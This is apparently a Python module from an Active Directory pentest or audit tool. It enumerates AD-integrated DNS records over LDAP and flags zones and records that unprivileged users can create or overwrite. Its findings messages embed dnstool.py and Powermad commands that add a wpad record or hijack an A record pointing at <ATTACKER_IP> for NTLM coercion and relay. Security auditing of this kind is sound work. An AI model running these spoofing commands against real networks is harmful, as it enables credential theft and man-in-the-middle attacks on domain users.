"""
ADIDNS module — Active Directory-integrated DNS enumeration & spoofing surface.

AD-integrated DNS zones live in LDAP application partitions
(`DC=DomainDnsZones,…`, `DC=ForestDnsZones,…`, legacy `CN=MicrosoftDNS,CN=System,…`)
and are readable by any authenticated user. Each zone is a `dnsZone` object; each
record is a `dnsNode` child whose binary `dnsRecord` attribute holds the type +
value. Two angles:

1. **Recon.** Parsing `dnsRecord` yields the full internal name→IP map (A/AAAA),
   services (SRV/CNAME), and often hosts that never appear in the computers
   module — all without a single DNS query or zone transfer.

2. **Spoofing / takeover.** By default the zone DACL grants *Authenticated Users*
   (and sometimes Everyone) the **Create Child** right → any user can add a new
   record (classic `wpad` / missing-name injection → NTLM coercion & relay,
   Kevin Robertson's Powermad / dirkjanm's dnstool.py). Where an individual
   record's DACL is writable by a non-privileged principal, that existing name
   can be **overwritten** (hijack a server's A record).

Pure LDAP: zone + node reads, `dnsRecord` parsing (utils.dnsrecord) and DACL
parsing (reuses modules.acls._parse_dacl). No writes.

⚠️ NOT VALIDATED LIVE (v2.12.0): implemented and unit-tested against mocked
   records / synthetic descriptors, but never run against a real DC.
"""

from modules.base import BaseModule, ScanContext
from core.output import Severity, C
from utils.ldap_helpers import get_attr, get_list, get_raw, get_raw_all, get_dn, SCOPE_SUBTREE
from utils.sids import resolve_sid, is_privileged_sid
from utils.dnsrecord import parse_records
from modules.acls import (
    _parse_dacl, GENERIC_ALL, GENERIC_WRITE, WRITE_DACL, WRITE_OWNER,
    RIGHT_DS_WRITE_PROP, FULL_CONTROL,
)

# ADS_RIGHT_DS_CREATE_CHILD — add a child object (here: a new DNS record).
CREATE_CHILD = 0x00000001

# Trustees that make a Create-Child grant broadly exploitable (any domain user /
# any machine can spoof). Domain-relative RIDs are matched separately.
_BROAD_WELL_KNOWN = {
    "S-1-1-0",       # Everyone
    "S-1-5-11",      # Authenticated Users
    "S-1-5-32-545",  # BUILTIN\Users
}
_BROAD_RIDS = {"513", "515", "545"}  # Domain Users, Domain Computers, (Users)

# Contextual / system trustees to ignore when scanning a record's own DACL:
# they are either noise (Creator Owner, Self) or already privileged.
_SKIP_SIDS = {
    "S-1-5-18",      # Local System
    "S-1-5-10",      # Self
    "S-1-3-0",       # Creator Owner
    "S-1-5-9",       # Enterprise Domain Controllers
}

# Any of these in a record's ACE mask = the trustee can overwrite the record.
_WRITE_BITS = (GENERIC_ALL | GENERIC_WRITE | WRITE_DACL | WRITE_OWNER
               | RIGHT_DS_WRITE_PROP)


def _is_broad(sid: str, domain_sid: str) -> bool:
    if sid in _BROAD_WELL_KNOWN:
        return True
    if domain_sid and sid.startswith(domain_sid + "-"):
        return sid[len(domain_sid) + 1:] in _BROAD_RIDS
    return False


def _rdn_value(dn: str) -> str:
    """Leftmost RDN value: 'DC=wpad,DC=corp.local,…' → 'wpad'."""
    if not dn:
        return ""
    first = dn.split(",", 1)[0]
    return first.split("=", 1)[-1] if "=" in first else first


def _zone_of(dn: str) -> str:
    """Zone name = the parent RDN value of a dnsNode DN."""
    if not dn or "," not in dn:
        return ""
    return _rdn_value(dn.split(",", 1)[1])


class ADIDNSModule(BaseModule):
    name        = "adidns"
    description = "AD-integrated DNS: records (recon) + zone/record spoofing surface"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        out.section("ADIDNS — AD-INTEGRATED DNS")

        partitions = self._partitions(ctx)
        zones: dict[str, dict] = {}   # zone DN -> {name, sd}
        nodes: list[dict] = []        # {name, zone, fqdn, records, sd}

        for base in partitions:
            entries = ctx.conn.search(
                "(|(objectClass=dnsZone)(objectClass=dnsNode))",
                ["name", "dc", "dnsRecord", "nTSecurityDescriptor", "objectClass"],
                base=base, scope=SCOPE_SUBTREE,
            )
            for e in entries:
                classes = {c.lower() for c in get_list(e, "objectClass")}
                dn = get_dn(e)
                if "dnszone" in classes:
                    zones[dn] = {
                        "name": get_attr(e, "dc") or get_attr(e, "name") or _rdn_value(dn),
                        "sd":   get_raw(e, "nTSecurityDescriptor"),
                    }
                elif "dnsnode" in classes:
                    recs = parse_records(get_raw_all(e, "dnsRecord"))
                    # drop pure tombstones (ZERO-only nodes)
                    if all(r[0] == "ZERO" for r in recs):
                        continue
                    label = get_attr(e, "dc") or _rdn_value(dn)
                    zone  = _zone_of(dn)
                    fqdn  = zone if label == "@" else f"{label}.{zone}"
                    nodes.append({
                        "name": label, "zone": zone, "fqdn": fqdn,
                        "records": recs, "sd": get_raw(e, "nTSecurityDescriptor"),
                    })

        if not zones and not nodes:
            out.info("No AD-integrated DNS zones readable (none present, or the "
                     "DNS partitions are not reachable by this identity)")
            return

        out.counter("DNS zones", len(zones), {"records": len(nodes)})

        self._dump_records(ctx, nodes)
        self._check_zone_create(ctx, zones, nodes)
        self._check_record_dacls(ctx, nodes)

    # ------------------------------------------------------------------ bases
    def _partitions(self, ctx: ScanContext) -> list[str]:
        base = ctx.base_dn
        forest = getattr(ctx.conn.dc_info, "forest_dn", "") or base
        cands = [
            f"DC=DomainDnsZones,{base}",
            f"DC=ForestDnsZones,{forest}",
            f"CN=MicrosoftDNS,CN=System,{base}",   # legacy (pre-2003 / replicated)
        ]
        seen, out = set(), []
        for c in cands:
            k = c.lower()
            if k not in seen:
                seen.add(k)
                out.append(c)
        return out

    # --------------------------------------------------------------- records
    def _dump_records(self, ctx: ScanContext, nodes: list) -> None:
        out = ctx.out
        if not nodes:
            return
        out.subsection("DNS records")
        rows = []
        for n in sorted(nodes, key=lambda x: (x["zone"], x["name"])):
            for rtype, val, _ts in n["records"]:
                if rtype == "ZERO":
                    continue
                hl = (rtype in ("A", "AAAA", "CNAME", "SRV"))
                rows.append([
                    n["fqdn"],
                    f"{C.CYAN}{rtype}{C.RESET}" if hl else rtype,
                    val,
                ])
        out.table(["Name", "Type", "Value"], rows, indent=4)

        hosts = sorted({n["fqdn"] for n in nodes
                        for (t, _v, _s) in n["records"] if t in ("A", "AAAA")})
        if hosts:
            ctx.quick_wins.add(
                Severity.INFO,
                f"ADIDNS — internal name→IP map leaked ({len(hosts)} host record(s))",
                "AD-integrated DNS is readable over LDAP → the full internal DNS "
                "map was dumped without a single DNS query or zone transfer. Cross-"
                "reference with the computers module for hosts not joined to AD "
                "(appliances, Linux, network gear):\n  "
                + ", ".join(hosts[:20]) + (" …" if len(hosts) > 20 else ""),
            )

    # ----------------------------------------------------------- zone spoof
    def _check_zone_create(self, ctx: ScanContext, zones: dict, nodes: list) -> None:
        out = ctx.out
        out.subsection("Zone Create-Child (record spoofing)")
        dsid = ctx.domain_sid

        spoofable = []   # (zone_name, trustee_name, trustee_sid, broad)
        for z in zones.values():
            if not z["sd"]:
                continue
            best = None
            for ace in _parse_dacl(z["sd"]):
                sid = ace["sid"]
                if sid in _SKIP_SIDS or is_privileged_sid(sid, dsid):
                    continue
                mask = ace["mask"]
                if mask & (CREATE_CHILD | GENERIC_ALL | GENERIC_WRITE):
                    broad = _is_broad(sid, dsid)
                    # keep the broadest trustee as the headline for the zone
                    if best is None or (broad and not best[2]):
                        best = (sid, resolve_sid(sid, dsid), broad)
            if best:
                spoofable.append((z["name"], best[1], best[0], best[2]))

        if not spoofable:
            out.success("No zone grants Create-Child to a non-privileged principal")
            return

        rows = [[zn, tname, tsid, "broad (any user)" if broad else "group-scoped"]
                for (zn, tname, tsid, broad) in spoofable]
        out.table(["Zone", "Trustee", "SID", "Reach"], rows, indent=4,
                  highlight_fn=lambda r: C.RED if "broad" in r[3] else C.YELLOW)

        for zn, tname, tsid, broad in spoofable:
            sev = Severity.HIGH if broad else Severity.MEDIUM
            # missing wpad in this zone?
            have = {n["name"].lower() for n in nodes if n["zone"] == zn}
            wpad = " wpad is ABSENT → add it to coerce WPAD-using clients.\n" \
                   if ("wpad" not in have and not zn.endswith(".arpa")) else "\n"
            ctx.quick_wins.add(
                sev,
                f"ADIDNS spoofing — '{tname}' can create records in zone {zn}",
                f"The zone DACL grants Create-Child to {tname} ({tsid}), so this "
                "identity can add arbitrary DNS records → NTLM coercion / relay "
                "(point a resolved-but-missing name, or wpad, at an attacker host)."
                + wpad +
                "  # dirkjanm dnstool.py (impacket):\n"
                f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
                f"--action add --record wpad --data <ATTACKER_IP> --type A "
                f"--zone {zn} {ctx.args.dc}\n"
                "  # or Powermad (from a domain-joined Windows host):\n"
                f"  Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData <ATTACKER_IP>",
            )

    # ---------------------------------------------------- record overwrite
    def _check_record_dacls(self, ctx: ScanContext, nodes: list) -> None:
        out = ctx.out
        out.subsection("Writable existing records (hijack)")
        dsid = ctx.domain_sid

        findings = []   # (fqdn, types, trustee, sid)
        for n in nodes:
            if not n["sd"]:
                continue
            types = ",".join(sorted({t for (t, _v, _s) in n["records"]
                                     if t != "ZERO"}))
            for ace in _parse_dacl(n["sd"]):
                sid = ace["sid"]
                if sid in _SKIP_SIDS or is_privileged_sid(sid, dsid):
                    continue
                mask = ace["mask"]
                if (mask & _WRITE_BITS) or (mask & FULL_CONTROL) == FULL_CONTROL:
                    findings.append((n["fqdn"], types or "-",
                                     resolve_sid(sid, dsid), sid))
                    break   # one finding per record is enough

        if not findings:
            out.success("No existing record is writable by a non-privileged principal")
            return

        rows = [[fqdn, types, tname] for (fqdn, types, tname, _s) in findings]
        out.table(["Record", "Type(s)", "Writable by"], rows, indent=4,
                  highlight_fn=lambda r: C.RED)

        lines = [f"  - {fqdn} ({types}) writable by {tname}"
                 for (fqdn, types, tname, _s) in findings]
        ctx.quick_wins.add(
            Severity.HIGH,
            f"ADIDNS — {len(findings)} existing record(s) writable by non-priv principals",
            "A non-privileged principal can overwrite these existing DNS records "
            "→ hijack a legitimate name (redirect a server's A record to an "
            "attacker host for coercion / MITM):\n" + "\n".join(lines) + "\n"
            "  # overwrite with dnstool.py --action modify:\n"
            f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
            "--action modify --record <name> --data <ATTACKER_IP> --type A "
            "--zone <zone> " + ctx.args.dc,
        )

    # --------------------------------------------------------------- helpers
    @staticmethod
    def _upn(ctx: ScanContext) -> str:
        a = ctx.args
        user = (getattr(a, "username", "") or "").split("@")[0] or "<user>"
        dom  = ctx.domain or (getattr(a, "domain", "") or "")
        return f"{dom}\\{user}" if dom else user
